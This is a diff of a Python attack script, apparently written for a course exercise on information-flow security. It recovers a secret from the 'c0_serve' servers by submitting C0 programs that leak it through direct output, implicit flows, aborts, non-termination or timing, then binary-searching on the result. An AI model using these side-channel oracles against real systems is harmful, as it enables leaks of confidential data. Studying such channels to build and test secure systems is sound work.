@@ -38,9 +38,43 @@ IMPLICIT_BOOLEAN_PROGRAM = """int main(int input, int secret) {
 }
 """
 
-ABORT_ORACLE_PROGRAM = """int main(int input, int secret) {
+ABORT_ERROR_ORACLE_PROGRAM = """int main(int input, int secret) {
   if (secret < input) {
     error("leak");
+  }
+  return 0;
+}
+"""
+
+ABORT_ASSERT_ORACLE_PROGRAM = """int main(int input, int secret) {
+  assert(!(secret < input));
+  return 0;
+}
+"""
+
+ABORT_DIVZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
+  int x = 1;
+  if (secret < input) {
+    x = x / 0;
+  }
+  return 0;
+}
+"""
+
+ABORT_MODZERO_ORACLE_PROGRAM = """int main(int input, int secret) {
+  int x = 1;
+  if (secret < input) {
+    x = x % 0;
+  }
+  return 0;
+}
+"""
+
+ABORT_OOB_ORACLE_PROGRAM = """int main(int input, int secret) {
+  int[] A = alloc_array(int, 1);
+  int x = 0;
+  if (secret < input) {
+    x = A[1];
   }
   return 0;
 }
@@ -55,15 +89,10 @@ TERMINATION_ORACLE_PROGRAM = """int main(int input, int secret) {
 }
 """
 
-TIMING_ORACLE_PROGRAM = """int main(int input, int secret) {
-  int warmup = 0;
-  while (warmup < 1000000) {
-    warmup = warmup + 1;
-  }
+TERMINATION_ORACLE_ALT_PROGRAM = """int main(int input, int secret) {
+  int stop = 0;
   if (secret < input) {
-    int burn = 0;
-    while (burn < 6000000) {
-      burn = burn + 1;
+    while (stop == 0) {
     }
   }
   return 0;
@@ -89,8 +118,19 @@ def log(msg: str) -> None:
     print(msg, flush=True)
 
 
-def parse_server_output(stdout: str) -> tuple[str, Optional[int]]:
-    line = stdout.strip().splitlines()[-1].strip() if stdout.strip() else ""
+def debug_log(enabled: bool, msg: str) -> None:
+    if enabled:
+        log(msg)
+
+
+def parse_server_output(stdout: str, stderr: str) -> tuple[str, Optional[int]]:
+    lines: list[str] = []
+    if stdout.strip():
+        lines.extend(x.strip() for x in stdout.strip().splitlines() if x.strip())
+    if stderr.strip():
+        lines.extend(x.strip() for x in stderr.strip().splitlines() if x.strip())
+    line = lines[-1] if lines else ""
+
     if line.startswith("success "):
         try:
             return "success", int(line.split()[1])
@@ -106,6 +146,14 @@ def parse_server_output(stdout: str) -> tuple[str, Optional[int]]:
     if line == "":
         return "no-output", None
     return "unknown", None
+
+
+def format_result(res: QueryResult) -> str:
+    tail = (res.stdout.strip().splitlines()[-1] if res.stdout.strip() else "").strip()
+    return (
+        f"kind={res.kind} value={res.value} exit={res.exit_code} "
+        f"elapsed={res.elapsed_s:.3f}s out={tail!r}"
+    )
 
 
 def run_query(
@@ -129,7 +177,7 @@ def run_query(
             check=False,
         )
         elapsed = time.perf_counter() - t0
-        kind, value = parse_server_output(cp.stdout)
+        kind, value = parse_server_output(cp.stdout, cp.stderr)
         return QueryResult(
             kind=kind,
             value=value,
@@ -170,12 +218,12 @@ class ProgramFile:
                 pass
 
 
-def binary_search_oracle(
-    oracle: Callable[[int], bool],
-) -> int:
+def binary_search_oracle(oracle: Callable[[int], bool]) -> int:
     lo = SECRET_MIN
     hi = SECRET_MAX_EXCLUSIVE
-    while lo + 1 < hi:
+    for _ in range(SECRET_BITS + 2):
+        if lo + 1 >= hi:
+            break
         mid = (lo + hi) // 2
         if oracle(mid):
             hi = mid
@@ -189,7 +237,7 @@ def recover_direct(
     server_command: str,
     userid: str,
     timeout_s: float,
-) -> Optional[int]:
+) -> int:
     with ProgramFile(DIRECT_FLOW_PROGRAM) as path:
         res = run_query(
             server_command=server_command,
@@ -200,7 +248,7 @@ def recover_direct(
         )
         if res.kind == "success" and res.value is not None:
             return res.value
-        return None
+        raise StrategyFailed(f"direct flow unavailable ({format_result(res)})")
 
 
 def recover_from_failure_oracle(
@@ -209,9 +257,9 @@ def recover_from_failure_oracle(
     userid: str,
     timeout_s: float,
     program_source: str,
-) -> Optional[int]:
+) -> int:
     with ProgramFile(program_source) as path:
-        def probe(mid: int) -> bool:
+        def classify(mid: int) -> bool:
             res = run_query(
                 server_command=server_command,
                 userid=userid,
@@ -223,25 +271,29 @@ def recover_from_failure_oracle(
                 raise StrategyFailed(f"already solved directly: {res.value}")
             if res.kind == "failure" and res.value in (0, 1):
                 return res.value == 1
-            raise StrategyFailed(f"oracle unavailable: {res.kind} {res.value}")
+            raise StrategyFailed(f"oracle unavailable ({format_result(res)})")
 
-        try:
-            return binary_search_oracle(probe)
-        except StrategyFailed as e:
-            msg = str(e)
-            if msg.startswith("already solved directly: "):
-                return int(msg.split(": ", 1)[1])
-            return None
+        boundary_lo = classify(SECRET_MIN)
+        boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
+        if boundary_lo or not boundary_hi:
+            raise StrategyFailed(
+                "boolean-oracle boundary check failed "
+                f"(at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
+            )
+        return binary_search_oracle(classify)
 
 
-def recover_from_abort_oracle(
+def recover_from_kind_oracle(
     *,
     server_command: str,
     userid: str,
     timeout_s: float,
-) -> Optional[int]:
-    with ProgramFile(ABORT_ORACLE_PROGRAM) as path:
-        def probe(mid: int) -> bool:
+    program_source: str,
+    true_kinds: set[str],
+    false_kinds: set[str],
+) -> int:
+    with ProgramFile(program_source) as path:
+        def classify(mid: int) -> bool:
             res = run_query(
                 server_command=server_command,
                 userid=userid,
@@ -251,51 +303,20 @@ def recover_from_abort_oracle(
             )
             if res.kind == "success" and res.value is not None:
                 raise StrategyFailed(f"already solved directly: {res.value}")
-            if res.kind == "abort":
+            if res.kind in true_kinds:
                 return True
-            if res.kind == "failure":
+            if res.kind in false_kinds:
                 return False
-            raise StrategyFailed(f"oracle unavailable: {res.kind}")
+            raise StrategyFailed(f"oracle unavailable ({format_result(res)})")
 
-        try:
-            return binary_search_oracle(probe)
-        except StrategyFailed as e:
-            msg = str(e)
-            if msg.startswith("already solved directly: "):
-                return int(msg.split(": ", 1)[1])
-            return None
-
-
-def recover_from_termination_oracle(
-    *,
-    server_command: str,
-    userid: str,
-    timeout_s: float,
-) -> Optional[int]:
-    with ProgramFile(TERMINATION_ORACLE_PROGRAM) as path:
-        def probe(mid: int) -> bool:
-            res = run_query(
-                server_command=server_command,
-                userid=userid,
-                program_path=path,
-                input_value=mid,
-                timeout_s=timeout_s,
+        boundary_lo = classify(SECRET_MIN)
+        boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
+        if boundary_lo or not boundary_hi:
+            raise StrategyFailed(
+                "kind-oracle boundary check failed "
+                f"(at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
             )
-            if res.kind == "success" and res.value is not None:
-                raise StrategyFailed(f"already solved directly: {res.value}")
-            if res.kind == "timeout":
-                return True
-            if res.kind == "failure":
-                return False
-            raise StrategyFailed(f"oracle unavailable: {res.kind}")
-
-        try:
-            return binary_search_oracle(probe)
-        except StrategyFailed as e:
-            msg = str(e)
-            if msg.startswith("already solved directly: "):
-                return int(msg.split(": ", 1)[1])
-            return None
+        return binary_search_oracle(classify)
 
 
 def median_runtime_for_input(
@@ -306,7 +327,7 @@ def median_runtime_for_input(
     input_value: int,
     timeout_s: float,
     repeats: int,
-) -> Optional[float]:
+) -> float:
     runtimes: list[float] = []
     for _ in range(repeats):
         res = run_query(
@@ -319,11 +340,26 @@ def median_runtime_for_input(
         if res.kind == "success" and res.value is not None:
             raise StrategyFailed(f"already solved directly: {res.value}")
         if res.kind != "failure":
-            raise StrategyFailed(f"timing probe rejected: {res.kind}")
+            raise StrategyFailed(f"timing probe rejected ({format_result(res)})")
         runtimes.append(res.elapsed_s)
-    if not runtimes:
-        return None
     return statistics.median(runtimes)
+
+
+def make_timing_oracle_program(*, warmup_iters: int, burn_iters: int) -> str:
+    return f"""int main(int input, int secret) {{
+  int warmup = 0;
+  while (warmup < {warmup_iters}) {{
+    warmup = warmup + 1;
+  }}
+  if (secret < input) {{
+    int burn = 0;
+    while (burn < {burn_iters}) {{
+      burn = burn + 1;
+    }}
+  }}
+  return 0;
+}}
+"""
 
 
 def recover_from_timing_oracle(
@@ -332,50 +368,100 @@ def recover_from_timing_oracle(
     userid: str,
     timeout_s: float,
     repeats: int,
-) -> Optional[int]:
-    with ProgramFile(TIMING_ORACLE_PROGRAM) as path:
-        try:
-            t_false = median_runtime_for_input(
-                server_command=server_command,
-                userid=userid,
-                program_path=path,
-                input_value=SECRET_MIN,
-                timeout_s=timeout_s,
-                repeats=repeats,
-            )
-            t_true = median_runtime_for_input(
-                server_command=server_command,
-                userid=userid,
-                program_path=path,
-                input_value=SECRET_MAX_EXCLUSIVE,
-                timeout_s=timeout_s,
-                repeats=repeats,
-            )
-            if t_false is None or t_true is None:
-                return None
-            if t_true <= t_false * 1.20:
-                return None
-            threshold = (t_false + t_true) / 2.0
+    debug: bool,
+) -> int:
+    calibration_repeats = max(5, repeats)
+    burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
+    min_ratio = 1.06
+    min_gap_s = 0.010
 
-            def probe(mid: int) -> bool:
-                t_mid = median_runtime_for_input(
+    last_failure = "no timing candidates worked"
+    for burn in burn_candidates:
+        source = make_timing_oracle_program(warmup_iters=1_000_000, burn_iters=burn)
+        with ProgramFile(source) as path:
+            try:
+                t_false = median_runtime_for_input(
                     server_command=server_command,
                     userid=userid,
                     program_path=path,
-                    input_value=mid,
+                    input_value=SECRET_MIN,
                     timeout_s=timeout_s,
-                    repeats=repeats,
+                    repeats=calibration_repeats,
                 )
-                if t_mid is None:
-                    raise StrategyFailed("timing measurement failed")
-                return t_mid > threshold
+                t_true = median_runtime_for_input(
+                    server_command=server_command,
+                    userid=userid,
+                    program_path=path,
+                    input_value=SECRET_MAX_EXCLUSIVE,
+                    timeout_s=timeout_s,
+                    repeats=calibration_repeats,
+                )
+            except StrategyFailed as e:
+                last_failure = str(e)
+                debug_log(debug, f"[timing] burn={burn}: {last_failure}")
+                continue
 
-            return binary_search_oracle(probe)
-        except StrategyFailed as e:
-            msg = str(e)
-            if msg.startswith("already solved directly: "):
-                return int(msg.split(": ", 1)[1])
-            return None
+            ratio = t_true / max(t_false, 1e-9)
+            gap = t_true - t_false
+            debug_log(
+                debug,
+                f"[timing] burn={burn}: baseline={t_false:.4f}s true={t_true:.4f}s "
+                f"ratio={ratio:.3f} gap={gap:.4f}s",
+            )
+            if ratio < min_ratio or gap < min_gap_s:
+                last_failure = (
+                    f"insufficient separation for burn={burn} "
+                    f"(ratio={ratio:.3f}, gap={gap:.4f}s)"
+                )
+                continue
+
+            threshold = (t_false + t_true) / 2.0
+
+            def classify(mid: int) -> bool:
+                # Majority vote improves stability under noisy shared machines.
+                votes_true = 0
+                votes_total = 3
+                for _ in range(votes_total):
+                    t_mid = median_runtime_for_input(
+                        server_command=server_command,
+                        userid=userid,
+                        program_path=path,
+                        input_value=mid,
+                        timeout_s=timeout_s,
+                        repeats=repeats,
+                    )
+                    if t_mid > threshold:
+                        votes_true += 1
+                return votes_true >= 2
+
+            boundary_lo = classify(SECRET_MIN)
+            boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
+            if boundary_lo or not boundary_hi:
+                last_failure = (
+                    "timing boundary check failed "
+                    f"for burn={burn} (at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
+                )
+                debug_log(debug, f"[timing] {last_failure}")
+                continue
+
+            return binary_search_oracle(classify)
+
+    raise StrategyFailed(last_failure)
+
+
+def attempt_strategy(
+    *,
+    server_idx: int,
+    name: str,
+    func: Callable[[], int],
+    debug: bool,
+) -> Optional[int]:
+    log(f"[serve{server_idx}] trying {name}")
+    try:
+        return func()
+    except StrategyFailed as e:
+        debug_log(debug, f"[serve{server_idx}] {name} unavailable: {e}")
+        return None
 
 
 def recover_server_secret(
@@ -385,55 +471,125 @@ def recover_server_secret(
     timeout_s: float,
     timing_timeout_s: float,
     timing_repeats: int,
+    debug: bool,
 ) -> Optional[int]:
     server_command = f"~mfredrik/bin/c0_serve{server_idx}"
-    log(f"[serve{server_idx}] trying direct explicit flow")
-    direct = recover_direct(
-        server_command=server_command,
-        userid=userid,
-        timeout_s=timeout_s,
-    )
-    if direct is not None:
-        return direct
+    strategies: list[tuple[str, Callable[[], int]]] = [
+        (
+            "direct explicit flow",
+            lambda: recover_direct(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+            ),
+        ),
+        (
+            "implicit-flow boolean oracle",
+            lambda: recover_from_failure_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=IMPLICIT_BOOLEAN_PROGRAM,
+            ),
+        ),
+        (
+            "abort oracle (error)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=ABORT_ERROR_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "abort oracle (assert)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=ABORT_ASSERT_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "abort oracle (divide by zero)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=ABORT_DIVZERO_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "abort oracle (mod by zero)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=ABORT_MODZERO_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "abort oracle (oob read)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=ABORT_OOB_ORACLE_PROGRAM,
+                true_kinds={"abort"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "nontermination oracle",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=TERMINATION_ORACLE_PROGRAM,
+                true_kinds={"timeout"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "nontermination oracle (alt loop)",
+            lambda: recover_from_kind_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timeout_s,
+                program_source=TERMINATION_ORACLE_ALT_PROGRAM,
+                true_kinds={"timeout"},
+                false_kinds={"failure"},
+            ),
+        ),
+        (
+            "timing oracle",
+            lambda: recover_from_timing_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=timing_timeout_s,
+                repeats=timing_repeats,
+                debug=debug,
+            ),
+        ),
+    ]
 
-    log(f"[serve{server_idx}] trying implicit-flow boolean oracle")
-    implicit = recover_from_failure_oracle(
-        server_command=server_command,
-        userid=userid,
-        timeout_s=timeout_s,
-        program_source=IMPLICIT_BOOLEAN_PROGRAM,
-    )
-    if implicit is not None:
-        return implicit
-
-    log(f"[serve{server_idx}] trying abort oracle")
-    abort_secret = recover_from_abort_oracle(
-        server_command=server_command,
-        userid=userid,
-        timeout_s=timeout_s,
-    )
-    if abort_secret is not None:
-        return abort_secret
-
-    log(f"[serve{server_idx}] trying nontermination oracle")
-    term_secret = recover_from_termination_oracle(
-        server_command=server_command,
-        userid=userid,
-        timeout_s=timeout_s,
-    )
-    if term_secret is not None:
-        return term_secret
-
-    log(f"[serve{server_idx}] trying timing oracle")
-    timing_secret = recover_from_timing_oracle(
-        server_command=server_command,
-        userid=userid,
-        timeout_s=timing_timeout_s,
-        repeats=timing_repeats,
-    )
-    if timing_secret is not None:
-        return timing_secret
-
+    for strategy_name, strategy_fn in strategies:
+        secret = attempt_strategy(
+            server_idx=server_idx,
+            name=strategy_name,
+            func=strategy_fn,
+            debug=debug,
+        )
+        if secret is not None:
+            return secret
     return None
 
 
@@ -461,7 +617,7 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
     p.add_argument(
         "--timing-timeout",
         type=float,
-        default=8.0,
+        default=12.0,
         help="Timeout for timing strategy measurements in seconds",
     )
     p.add_argument(
@@ -469,6 +625,11 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
         type=int,
         default=3,
         help="Repetitions per timing measurement (median is used)",
+    )
+    p.add_argument(
+        "--debug",
+        action="store_true",
+        help="Print detailed strategy failure diagnostics",
     )
     return p.parse_args(argv)
 
@@ -491,6 +652,7 @@ def main(argv: list[str]) -> int:
             timeout_s=args.query_timeout,
             timing_timeout_s=args.timing_timeout,
             timing_repeats=args.timing_repeats,
+            debug=args.debug,
         )
         if secret is None:
             log(f"[serve{idx}] not recovered")
@@ -504,7 +666,7 @@ def main(argv: list[str]) -> int:
         log(
             "Unresolved servers: "
             + ", ".join(str(i) for i in unresolved)
-            + ". One server may be intentionally secure."
+            + ". One server may be intentionally secure, or timing may need tuning."
         )
         return 2
     log("All requested servers recovered.")
